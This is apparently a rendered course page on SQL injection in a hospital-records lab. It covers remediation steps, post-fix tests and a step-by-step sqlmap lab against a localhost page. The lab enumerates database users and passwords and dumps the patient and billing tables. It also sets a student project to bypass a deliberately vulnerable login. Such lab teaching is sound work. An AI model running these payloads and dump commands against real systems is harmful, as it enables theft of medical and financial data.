",(0,i.jsx)(n.code,{children:"CONCAT('%', ?, '%')"})," (or binds ",(0,i.jsx)(n.code,{children:"'%'.$q.'%'"})," as a parameter depending on the API) so the wildcard logic stays data-bound."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Prevents attackers from injecting quotes or ",(0,i.jsx)(n.code,{children:"UNION"})," constructs inside the ",(0,i.jsx)(n.code,{children:"LIKE"})," expression."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Input normalization & basic validation"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Trim input, enforce a reasonable maximum length, and optionally restrict characters (e.g., block control characters). Use whitelist validation where applicable."}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Limits attacker-controlled input size and avoids unexpected characters that may make exploitation easier or cause DoS."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Least-privilege DB account"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["The application uses a database user with only the permissions necessary (e.g., ",(0,i.jsx)(n.code,{children:"SELECT"})," on specific columns/tables) rather than a high-privilege ",(0,i.jsx)(n.code,{children:"root"})," account."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Even if SQLi were present, the attacker\u2019s ability to read or modify data would be constrained by DB permissions."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Remove or avoid debug SQL exposure"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["The fixed version does ",(0,i.jsx)(n.strong,{children:"not"})," print the full interpolated SQL to the page. Debugging information is logged to server-side logs (with redaction) when needed, not echoed to clients."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Avoids giving attackers direct insight into query structure and helps prevent information leakage."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Safe error handling & logging"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Catch/handle DB errors gracefully. Return user-friendly messages (e.g., \u201cNo results found\u201d) and write detailed errors to server logs that are protected and redacted for PHI."}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Prevents error-based injection discovery and protects sensitive data from being logged in plain text."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Limit returned columns & pagination"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Query only the columns required for the view (avoid ",(0,i.jsx)(n.code,{children:"SELECT *"}),"). Keep ",(0,i.jsx)(n.code,{children:"LIMIT"})," and add pagination controls to restrict bulk exfiltration in normal operation."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Reduces attack surface and the amount of data an attacker can retrieve in one query."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Monitoring & alerting hooks"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Add server-side checks to log anomalous query patterns (large result sets, repeated unusual parameters) and integrate with DB activity monitoring or WAF telemetry."}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Why it helps:"})," Improves detection of attempted exploits and enables faster incident response."]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"what-to-test-after-deploying-the-fixed-code",children:"What to test after deploying the fixed code"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Functionality tests"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Normal searches (e.g., ",(0,i.jsx)(n.code,{children:"John"}),", ",(0,i.jsx)(n.code,{children:"Jane"}),") still return expected results."]}),"\n",(0,i.jsx)(n.li,{children:"Pagination and result limits behave correctly."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Security tests (lab environment)"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Re-run the earlier SQLi payloads used against the vulnerable page (e.g., ",(0,i.jsx)(n.code,{children:"' OR '1'='1"}),", ",(0,i.jsx)(n.code,{children:"UNION SELECT ..."}),") and confirm they ",(0,i.jsx)(n.strong,{children:"no longer"})," modify query logic or return unexpected rows."]}),"\n",(0,i.jsx)(n.li,{children:"Test blind/time-based payloads; responses should not change to reveal data."}),"\n",(0,i.jsx)(n.li,{children:"Confirm that supplying very long input strings is handled (max length enforced)."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Error handling & logging"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Trigger a controlled DB error (in a safe way) and confirm the user-facing message is generic while the detailed error is written to a protected log (with no PHI)."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Permission validation"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Verify the DB user used by the application cannot perform actions beyond its needs (no ",(0,i.jsx)(n.code,{children:"DROP"}),", ",(0,i.jsx)(n.code,{children:"INSERT"}),", ",(0,i.jsx)(n.code,{children:"UPDATE"})," if not required)."]}),"\n",(0,i.jsx)(n.li,{children:"Attempt queries that would require elevated privileges and confirm they fail with permission errors for the app user."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Regression checks"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Ensure the fixed code still meets performance expectations and does not introduce latency when binding parameters."}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsxs)(n.h1,{id:"sqlmap-lab--automated-sql-injection-with-sqlmap",children:["SQLMap Lab \u2014 Automated SQL Injection with ",(0,i.jsx)(n.code,{children:"sqlmap"})]}),"\n",(0,i.jsxs)(n.p,{children:["This section shows how to use ",(0,i.jsx)(n.strong,{children:"sqlmap"})," to discover and exploit the SQL Injection vulnerability in the vulnerable ",(0,i.jsx)(n.code,{children:"patient_lookup.php"})," lab page.",(0,i.jsx)(n.br,{}),"\n","It starts from installation, moves to discovery, enumeration, targeted extraction (patients & billing), and concludes with guidance on interpreting results and safe practices."]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"lab-assumptions--target",children:"Lab assumptions & target"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Vulnerable page (lab): ",(0,i.jsx)(n.code,{children:"http://127.0.0.1:8080/patient_lookup.php?q=John"})]}),"\n",(0,i.jsxs)(n.li,{children:["Database: ",(0,i.jsx)(n.code,{children:"hospital_emr"})," (schema and sample data already prepared in the ",(0,i.jsx)(n.strong,{children:"Setup"})," page)"]}),"\n",(0,i.jsxs)(n.li,{children:["You run commands on the lab host (Linux/macOS/Windows WSL) with ",(0,i.jsx)(n.code,{children:"python3"})," and ",(0,i.jsx)(n.code,{children:"pip"})," available."]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"1--install-sqlmap",children:"1 \u2014 Install sqlmap"}),"\n",(0,i.jsxs)(n.h3,{id:"option-a--via-pip-portable",children:["Option A \u2014 via ",(0,i.jsx)(n.code,{children:"pip"})," (portable)"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"python3 -m pip install --user sqlmap\n# ensure ~/.local/bin is in PATH if installed with --user\n"})}),"\n",(0,i.jsx)(n.h3,{id:"option-b--clone-latest-from-github-recommended-for-newest-features",children:"Option B \u2014 clone latest from GitHub (recommended for newest features)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bach",children:"git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\n# run via: python3 sqlmap.py ...\n"})}),"\n",(0,i.jsx)(n.h2,{id:"2--safe-discovery-non-destructive",children:"2 \u2014 Safe discovery (non-destructive)"}),"\n",(0,i.jsx)(n.p,{children:"Start with a low-risk check to see if q is injectable (no dumping):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=John" --batch --level=1 --risk=1 --technique=BE --threads=2\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"--level / --risk control intensity (begin low)."}),"\n",(0,i.jsx)(n.li,{children:"--technique=BE limits checks to Boolean & Error types."}),"\n",(0,i.jsx)(n.li,{children:"--batch auto-answers prompts for automation."}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Expected:"})," sqlmap reports whether it found an injectable parameter and which technique succeeded."]}),"\n",(0,i.jsx)(n.h2,{id:"3--force-probing-the-q-parameter",children:"3 \u2014 Force probing the q parameter"}),"\n",(0,i.jsx)(n.p,{children:"Let sqlmap probe the q parameter explicitly:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --batch --level=2 --risk=1\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Use q=* to instruct sqlmap to test that parameter."}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"4--enumerate-databases--users",children:"4 \u2014 Enumerate databases / users"}),"\n",(0,i.jsx)(n.p,{children:"Once injection is confirmed, enumerate DBs and users:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:['sqlmap -u "',(0,i.jsx)(n.a,{href:"http://127.0.0.1:8080/patient_lookup.php?q=",children:"http://127.0.0.1:8080/patient_lookup.php?q="}),'*" --dbs --batch']}),"\n",(0,i.jsxs)(n.li,{children:['sqlmap -u "',(0,i.jsx)(n.a,{href:"http://127.0.0.1:8080/patient_lookup.php?q=",children:"http://127.0.0.1:8080/patient_lookup.php?q="}),'*" --current-db --batch']}),"\n",(0,i.jsxs)(n.li,{children:['sqlmap -u "',(0,i.jsx)(n.a,{href:"http://127.0.0.1:8080/patient_lookup.php?q=",children:"http://127.0.0.1:8080/patient_lookup.php?q="}),'*" --users --passwords --batch']}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Goal:"})," confirm hospital_emr exists and inspect DB users (lab only)."]}),"\n",(0,i.jsx)(n.h2,{id:"5--list-tables-in-hospital_emr",children:"5 \u2014 List tables in hospital_emr"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr --tables --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"You should see tables such as patients, billing, appointments, etc."}),"\n",(0,i.jsx)(n.h2,{id:"6--list-columns-for-a-table-example-patients",children:"6 \u2014 List columns for a table (example: patients)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --columns --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"This reveals column names and types (e.g., id, medical_record_number, first_name, last_name, dob, email)."}),"\n",(0,i.jsx)(n.h2,{id:"7--dump-table-data-targeted-extraction",children:"7 \u2014 Dump table data (targeted extraction)"}),"\n",(0,i.jsx)(n.p,{children:"Dump entire table (lab only):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --dump --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"Dump specific columns only (recommended for focused demo):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients -C "medical_record_number,first_name,last_name,email" --dump --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"Dump rows with a WHERE clause:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --where="email LIKE \'%@example.test\'" --dump --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"Dump billing table (exfiltration demo):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T billing --dump --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Notes:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"--dump extracts and saves data in sqlmap's output folder (check path in sqlmap output)."}),"\n",(0,i.jsx)(n.li,{children:"Use -C to limit columns and reduce noise."}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"8--if-the-site-uses-post-form-instead-of-get",children:"8 \u2014 If the site uses POST (form) instead of GET"}),"\n",(0,i.jsx)(n.p,{children:"Simulate POST body with --data:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php" --data="q=John" -p q --batch\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"-p q tells sqlmap to focus on parameter q."}),"\n",(0,i.jsx)(n.li,{children:"Use --data for POST targets."}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"9--advanced-options--practical-tips",children:"9 \u2014 Advanced options & practical tips"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Increase depth for more aggressive tests:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bahs",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --level=5 --risk=3 --batch\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Use tamper scripts if basic payloads are filtered (only in lab):"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --tamper=between,randomcase --batch\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Set custom headers / cookies if the app requires authentication:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --headers="User-Agent: sqlmap" --cookie="SESSION=abcd" --batch\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Threads for speed:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --threads=5 --batch\n'})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Specify output directory:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --output-dir=./sqlmap-output --batch\n'})}),"\n",(0,i.jsx)(n.h2,{id:"10--interpreting-sqlmap-output",children:"10 \u2014 Interpreting sqlmap output"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Injection confirmation: sqlmap prints which parameter and which technique succeeded (e.g., Parameter: q (GET) \u2014 Type: UNION query)."}),"\n",(0,i.jsx)(n.li,{children:"Database listing / tables / columns: outputs are printed and saved under sqlmap output directory."}),"\n",(0,i.jsx)(n.li,{children:"Dump results: data is shown in terminal and saved to files (CSV/TXT) \u2014 use these files for lab reports."}),"\n",(0,i.jsx)(n.li,{children:"Logs: check sqlmap verbose output for payloads used \u2014 useful to teach how exploitation maps to manual payloads."}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"11--when-union-fails-use-blind-or-time-based-options",children:"11 \u2014 When UNION fails: use blind or time-based options"}),"\n",(0,i.jsx)(n.p,{children:"Boolean-based (slower, less noisy):"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=B --batch\n'})}),"\n",(0,i.jsx)(n.p,{children:"Time-based:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=T --sleep=3 --batch\n'})}),"\n",(0,i.jsx)(n.h2,{id:"12--safety-etiquette--cleanup",children:"12 \u2014 Safety, etiquette & cleanup"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Safety: Never run sqlmap against production services or external targets without written permission. This lab must be isolated (use local VM or container)."}),"\n",(0,i.jsx)(n.li,{children:"Rate & resource caution: Aggressive scans can disrupt your DB server. Use --level/--risk conservatively and avoid --threads that overwhelm the server."}),"\n",(0,i.jsx)(n.li,{children:"Network & logs: sqlmap may generate many requests \u2014 review web server logs and DB logs after testing to demonstrate forensic traces."}),"\n",(0,i.jsx)(n.li,{children:"Cleanup: After the lab, remove extracted files from the host if they contain sensitive sample data:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"rm -rf ~/.local/share/sqlmap/output/*\n# or the output dir you specified\n"})}),"\n",(0,i.jsx)(n.h2,{id:"13--verifying-fix-post-remediation",children:"13 \u2014 Verifying fix (post-remediation)"}),"\n",(0,i.jsx)(n.p,{children:"After you deploy patient_lookup_fixed.php (prepared statements), validate that sqlmap can no longer exploit the parameter:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://127.0.0.1:8080/patient_lookup_fixed.php?q=*" --batch --level=2 --risk=1\n'})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Expected:"})," sqlmap should not confirm injection; attempts to dump should fail or produce no results."]}),"\n",(0,i.jsx)(n.h2,{id:"mini-project--login-page-vulnerable--fixed-final-instructions",children:"Mini Project \u2014 Login Page: Vulnerable & Fixed (Final Instructions)"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Objective (short):"}),(0,i.jsx)(n.br,{}),"\n","Implement two login page for the ",(0,i.jsx)(n.code,{children:"Hospital"})," lab \u2014 one ",(0,i.jsx)(n.strong,{children:"vulnerable"})," to SQL Injection and one ",(0,i.jsx)(n.strong,{children:"fixed"}),".\nAttack the vulnerable version (manually and with tools) to ",(0,i.jsx)(n.strong,{children:"bypass the login"})," and to ",(0,i.jsx)(n.strong,{children:"retrieve sensitive information"})," from the web application.\nProduce a single PDF that contains everything and submit it."]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"what-students-must-do-concise",children:"What students must do (concise)"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Build / deploy both pages in the lab environment:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"login_vuln.php"})," \u2014 intentionally vulnerable version."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"login_fixed.php"})," \u2014 secure version using prepared statements and safe error handling."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["Using ",(0,i.jsx)(n.strong,{children:"manual techniques"})," and ",(0,i.jsx)(n.strong,{children:"sqlmap"})," (or similar), attempt to:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Bypass the login"})," (e.g., authenticate as another user)."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Retrieve sensitive data"})," accessible through the application (examples: user list, patient identifiers, billing rows, etc.)."]}),"\n",(0,i.jsx)(n.li,{children:"Explore other information exposed by the site (pages, endpoints, or debug output)."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["Collect ",(0,i.jsx)(n.strong,{children:"all evidence"})," of your work (payloads, command lines, outputs, screenshots, notes)."]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"submission-single-pdf-only",children:"Submission (single PDF only)"}),"\n",(0,i.jsxs)(n.p,{children:["Create ",(0,i.jsx)(n.strong,{children:"one"})," PDF file and submit it via the Google Form link below (demo \u2014 replace later):",(0,i.jsx)(n.br,{}),"\n",(0,i.jsx)(n.strong,{children:(0,i.jsx)(n.a,{href:"https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header",children:"https://docs.google.com/forms/d/e/1FAIpQLSfy5WQdFYPU28b84C4wR7wW4SyCi_1S6q9KRgrHi1Sj3vLQwA/viewform?usp=header"})})]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>a});var t=s(6540);const i={},l=t.createContext(i);function r(e){const n=t.useContext(l);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(l.Provider,{value:n},e.children)}}}]);